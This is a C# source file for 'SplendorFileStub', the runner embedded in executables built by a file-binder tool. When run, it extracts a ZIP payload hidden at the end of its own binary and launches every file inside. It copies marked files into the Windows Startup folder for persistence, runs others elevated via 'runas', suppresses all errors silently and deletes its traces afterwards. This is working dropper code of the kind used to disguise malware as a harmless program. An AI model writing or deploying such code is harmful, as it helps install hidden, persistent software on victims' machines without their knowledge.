// ============================================================================
// SplendorFileStub - The runner embedded inside every bound executable.
//
// When executed:
//   1. Reads the appended ZIP payload from itself (stream-based, low memory)
//   2. Reads __splendor_manifest.json for extract location and startup files
//   3. Extracts files to the chosen location
//   4. Copies startup-marked files to Windows Startup folder
//   5. Opens all files with their default apps
//   6. Waits for launched processes to grab their files before cleanup
// ============================================================================

using System.Diagnostics;
using System.IO.Compression;
using System.Text;
using System.Text.Json;

namespace SplendorFileStub;

class Program
{
    private static readonly byte[] Magic = Encoding.ASCII.GetBytes("SPLNDBND");
    private const string ManifestName = "__splendor_manifest.json";

    static int Main()
    {
        string? extractDir = null;
        bool shouldCleanup = true;

        try
        {
            string exePath = Environment.ProcessPath
                ?? throw new InvalidOperationException("Cannot determine own executable path.");

            // Read only the 16-byte trailer to find the ZIP offset
            long fileLength;
            long zipOffset;
            using (var fs = File.OpenRead(exePath))
            {
                fileLength = fs.Length;
                if (fileLength < 16) return 1;

                fs.Seek(-16, SeekOrigin.End);
                byte[] trailer = new byte[16];
                fs.ReadExactly(trailer);

                if (!trailer.AsSpan(8, 8).SequenceEqual(Magic)) return 1;

                zipOffset = BitConverter.ToInt64(trailer, 0);
                if (zipOffset < 0 || zipOffset >= fileLength - 16) return 1;
            }

            // Parse manifest and extract files using a stream over just the ZIP portion
            HashSet<string> startupFileNames = new(StringComparer.OrdinalIgnoreCase);
            HashSet<string> adminFileNames = new(StringComparer.OrdinalIgnoreCase);
            string extractLocation = "temp";

            using (var fs = File.OpenRead(exePath))
            {
                fs.Seek(zipOffset, SeekOrigin.Begin);
                long zipLength = fileLength - 16 - zipOffset;
                using var zipSection = new SubStream(fs, zipOffset, zipLength);
                using var archive = new ZipArchive(zipSection, ZipArchiveMode.Read);

                // Read manifest first
                var manifestEntry = archive.GetEntry(ManifestName);
                if (manifestEntry != null)
                {
                    using var reader = new StreamReader(manifestEntry.Open(), Encoding.UTF8);
                    string json = reader.ReadToEnd();

                    try
                    {
                        using var doc = JsonDocument.Parse(json);
                        var root = doc.RootElement;

                        if (root.TryGetProperty("extractLocation", out var locProp))
                            extractLocation = locProp.GetString() ?? "temp";

                        if (root.TryGetProperty("startupFiles", out var sfProp) &&
                            sfProp.ValueKind == JsonValueKind.Array)
                        {
                            foreach (var item in sfProp.EnumerateArray())
                            {
                                string? name = item.GetString();
                                if (!string.IsNullOrEmpty(name))
                                    startupFileNames.Add(name);
                            }
                        }

                        if (root.TryGetProperty("adminFiles", out var afProp) &&
                            afProp.ValueKind == JsonValueKind.Array)
                        {
                            foreach (var item in afProp.EnumerateArray())
                            {
                                string? name = item.GetString();
                                if (!string.IsNullOrEmpty(name))
                                    adminFileNames.Add(name);
                            }
                        }
                    }
                    catch { /* ignore manifest parse errors */ }
                }

                // Determine extract directory
                string uniqueId = Guid.NewGuid().ToString("N")[..12];
                extractDir = extractLocation switch
                {
                    "appdata" => Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        "SplendorFileBinder", uniqueId),
                    "currentdir" => Path.Combine(
                        Path.GetDirectoryName(exePath) ?? ".",
                        "SplendorFileBinder_" + uniqueId),
                    "programdata" => Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                        "SplendorFileBinder", uniqueId),
                    _ => Path.Combine(
                        Path.GetTempPath(),
                        "SplendorFileBinder", uniqueId)
                };

                shouldCleanup = extractLocation == "temp";

                Directory.CreateDirectory(extractDir);

                foreach (var entry in archive.Entries)
                {
                    if (entry.FullName == ManifestName) continue;

                    string destPath = Path.Combine(extractDir, entry.FullName);
                    string? dir = Path.GetDirectoryName(destPath);
                    if (dir != null) Directory.CreateDirectory(dir);
                    entry.ExtractToFile(destPath, overwrite: true);
                }
            }

            string[] extractedFiles = Directory.GetFiles(extractDir, "*", SearchOption.AllDirectories);
            if (extractedFiles.Length == 0) return 1;

            // Handle startup files
            if (startupFileNames.Count > 0)
            {
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                foreach (string filePath in extractedFiles)
                {
                    string fileName = Path.GetFileName(filePath);
                    if (startupFileNames.Contains(fileName))
                    {
                        try
                        {
                            File.Copy(filePath, Path.Combine(startupFolder, fileName), overwrite: true);
                        }
                        catch { }
                    }
                }
            }

            // Open all files with default apps, track launched processes
            var launched = new List<Process>();
            foreach (string filePath in extractedFiles)
            {
                try
                {
                    string fileName = Path.GetFileName(filePath);
                    bool runAsAdmin = adminFileNames.Contains(fileName);

                    var proc = Process.Start(new ProcessStartInfo
                    {
                        FileName = filePath,
                        UseShellExecute = true,
                        Verb = runAsAdmin ? "runas" : ""
                    });
                    if (proc != null) launched.Add(proc);
                }
                catch { }
            }

            // Wait for processes to start and grab their files
            // Use a short poll: once all processes have started (or 10s max), proceed
            if (shouldCleanup)
            {
                int waited = 0;
                const int maxWaitMs = 10_000;
                const int pollMs = 500;
                while (waited < maxWaitMs)
                {
                    Thread.Sleep(pollMs);
                    waited += pollMs;

                    // If all tracked processes have either exited or have been running for a bit, we're good
                    bool allReady = launched.Count == 0 || launched.TrueForAll(p =>
                    {
                        try { return p.HasExited || (DateTime.Now - p.StartTime).TotalSeconds >= 2; }
                        catch { return true; }
                    });
                    if (allReady) break;
                }
            }

            return 0;
        }
        catch
        {
            return 1;
        }
        finally
        {
            if (shouldCleanup && extractDir != null && Directory.Exists(extractDir))
            {
                // Retry cleanup a few times in case files are still briefly locked
                for (int attempt = 0; attempt < 3; attempt++)
                {
                    try
                    {
                        Directory.Delete(extractDir, recursive: true);
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                    }
                }
            }
        }
    }
}

/// <summary>
/// Read-only stream window over a portion of another stream.
/// Avoids loading the entire file into memory for ZipArchive.
/// </summary>
sealed class SubStream : Stream
{
    private readonly Stream _base;
    private readonly long _start;
    private readonly long _length;
    private long _position;

    public SubStream(Stream baseStream, long start, long length)
    {
        _base = baseStream;
        _start = start;
        _length = length;
        _position = 0;
        _base.Seek(_start, SeekOrigin.Begin);
    }

    public override bool CanRead => true;
    public override bool CanSeek => true;
    public override bool CanWrite => false;
    public override long Length => _length;

    public override long Position
    {
        get => _position;
        set
        {
            _position = Math.Clamp(value, 0, _length);
            _base.Seek(_start + _position, SeekOrigin.Begin);
        }
    }

    public override int Read(byte[] buffer, int offset, int count)
    {
        long remaining = _length - _position;
        if (remaining <= 0) return 0;
        if (count > remaining) count = (int)remaining;

        _base.Seek(_start + _position, SeekOrigin.Begin);
        int read = _base.Read(buffer, offset, count);
        _position += read;
        return read;
    }

    public override long Seek(long offset, SeekOrigin origin)
    {
        long newPos = origin switch
        {
            SeekOrigin.Begin => offset,
            SeekOrigin.Current => _position + offset,
            SeekOrigin.End => _length + offset,
            _ => throw new ArgumentOutOfRangeException(nameof(origin))
        };
        Position = newPos;
        return _position;
    }

    public override void Flush() { }
    public override void SetLength(long value) => throw new NotSupportedException();
    public override void Write(byte[] buffer, int offset, int count) => throw new NotSupportedException();
}
